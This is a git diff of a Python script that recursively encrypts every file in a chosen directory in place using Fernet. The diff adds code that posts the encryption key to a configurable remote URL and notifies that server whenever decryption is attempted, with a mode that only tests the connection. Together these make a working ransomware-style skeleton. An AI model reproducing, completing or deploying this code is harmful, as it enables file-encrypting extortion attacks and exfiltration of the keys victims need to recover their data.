@@ -5,84 +5,120 @@ from os.path import exists
 from checksumdir import dirhash
 import requests
 
-decrypt = input("What do you want to do? (decrypt/encrypt): ")
+#################################################
+#    POSTING TO SERVER IS NOT ON BY DEFAULT     #
+#      SET THE POST URL BELOW THIS COMMENT      #
+#          https://github.com/qtchaos           #
+#################################################
 
-if decrypt == "decrypt":
-    decrypt = True
-else:
-    decrypt = False
+PostURL = ''  # <---------- INSERT POST URL HERE
+notifyServer = True  # Notifies server if files are decrypted.
+testConnection = False  # Disables encryption/decryption feature, only POST's to server to check the connection.
 
-# key generation
-if not exists('filekey.key'):
-    key = Fernet.generate_key()
-else:
-    with open('filekey.key', 'rb') as filebytes:
-        key = filebytes.read()
+##########################################################################
+# DON'T EDIT ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING! #
+##########################################################################
 
-with open('filekey.key', 'wb') as filekey:
-    filekey.write(key)
+if not testConnection:
+    decrypt = input("What do you want to do? (decrypt/encrypt): ")
+    path = input("Enter directory to encrypt/decrypt: ")
 
-with open('filekey.key', 'rb') as filekey:
-    key = filekey.read()
-    # url = ''
-    # headers = {"Content-Type": "application/json; charset=utf-8"}
-    #
-    # myobj = {
-    #     'key': str(key)[2:-1]
-    # }
-    #
-    #
-    # x = requests.post(url, json=myobj)
-    # print(f' POST request: {x.status_code}')
+    filelist = []
+    globalTimeStart = time.perf_counter()
 
-fernet = Fernet(key)
+    if decrypt == "decrypt":
+        decrypt = True
+        if notifyServer:
+            NotifyData = 'An attempt has been made at decryption.'
+            NotifyHeaders = {"Content-Type": "text/plain; charset=utf-8"}
+            requests.post(PostURL, data=NotifyData, headers=NotifyHeaders)
+    else:
+        decrypt = False
 
-maintimestart = time.perf_counter()
+    # key generation
+    if not exists('filekey.key'):
+        key = Fernet.generate_key()
+    else:
+        with open('filekey.key', 'rb') as filebytes:
+            key = filebytes.read()
 
-path = input("Enter directory to encrypt/decrypt: ")
-filelist = []
+    with open('filekey.key', 'wb') as filekey:
+        filekey.write(key)
 
-for root, dirs, files in os.walk(path):
-    for file in files:
-        # append the file name to the list
-        filelist.append(os.path.join(root, file))
+    with open('filekey.key', 'rb') as filekey:
+        key = filekey.read()
 
-if decrypt:
-    i = 1
-    for name in filelist:
-        tic = time.perf_counter()
-        with open(name, 'rb') as enc_file:
-            encrypted = enc_file.read()
-            decrypted = fernet.decrypt(encrypted)
-        with open(name, 'wb') as dec_file:
-            dec_file.write(decrypted)
-            toc = time.perf_counter()
-            print(f"Decrypted file {i} in {toc - tic:0.4f} seconds. Total time: {toc - maintimestart:0.4f} seconds")
-            i += 1
-    with open("checksum.MD5", "r") as file:
-        generatedHash = dirhash(path, 'md5')
-        checkHash = file.read()
-        print(f"Hash generated at encryption: {checkHash}, hash generated after decryption: {generatedHash}")
-        if checkHash == generatedHash:
-            print("HASHES MATCH!")
-        else:
-            print("HASHES DON'T MATCH!")
-else:
-    i = 1
-    print("Calculating hash...")
-    with open("checksum.MD5", "w") as file:
-        a = dirhash(path, 'md5')
-        file.write(a)
-        print(f"Hash of directory: {a}")
+    fernet = Fernet(key)
 
-    for name in filelist:
-        tic = time.perf_counter()
-        with open(name, 'rb') as file:
-            original = file.read()
-            encrypted = fernet.encrypt(original)
-        with open(name, 'wb') as encrypted_file:
-            encrypted_file.write(encrypted)
-            toc = time.perf_counter()
-            print(f"Encrypted file {i} in {toc - tic:0.4f} seconds. Total time: {toc - maintimestart:0.4f} seconds")
-        i += 1
 
+def main():
+    if not testConnection:
+        work()
+        if PostURL:
+            post()
+    else:
+        testconnection()
+
+
+def post():
+    headers = {"Content-Type": "application/json; charset=utf-8"}
+
+    x = requests.post(PostURL, json={'key': str(key)[2:-1]}, headers=headers)
+    print('POST request: ' + str(x.status_code))
+
+
+def work():
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            filelist.append(os.path.join(root, file))
+
+    if decrypt:
+        fileCount = 1
+        for name in filelist:
+            tic = time.perf_counter()
+            with open(name, 'rb') as enc_file:
+                encrypted = enc_file.read()
+                decrypted = fernet.decrypt(encrypted)
+            with open(name, 'wb') as dec_file:
+                dec_file.write(decrypted)
+                toc = time.perf_counter()
+                print(
+                    f"Decrypted file {fileCount} in {toc - tic:0.4f} seconds. Total time: {toc - globalTimeStart:0.4f} seconds")
+                fileCount += 1
+        with open("checksum.MD5", 'r') as file:
+            print('NOT FROZEN, HASH IS BEING GENERATED!')
+            generatedHash = dirhash(path, 'md5')
+            checkHash = file.read()
+            print(f"Hash generated at encryption: {checkHash}, hash generated after decryption: {generatedHash}")
+            if checkHash == generatedHash:
+                print("HASHES MATCH!")
+            else:
+                print("HASHES DON'T MATCH!")
+    else:
+        fileCount = 1
+        print("Calculating hash...")
+        with open("checksum.MD5", 'w''') as file:
+            a = dirhash(path, 'md5')
+            file.write(a)
+            print(f"Hash of directory: {a}")
+
+        for name in filelist:
+            tic = time.perf_counter()
+            with open(name, 'rb') as file:
+                original = file.read()
+                encrypted = fernet.encrypt(original)
+            with open(name, 'wb') as encrypted_file:
+                encrypted_file.write(encrypted)
+                toc = time.perf_counter()
+                print(f"Encrypted file {fileCount} in {toc - tic:0.4f} seconds. Total time: {toc - globalTimeStart:0.4f} seconds")
+            fileCount += 1
+
+
+def testconnection():
+    data = 'Connection made.'
+    headers = {"Content-Type": "text/plain; charset=utf-8"}
+    requests.post(PostURL, data=data, headers=headers)
+
+
+if __name__ == "__main__":
+    main()
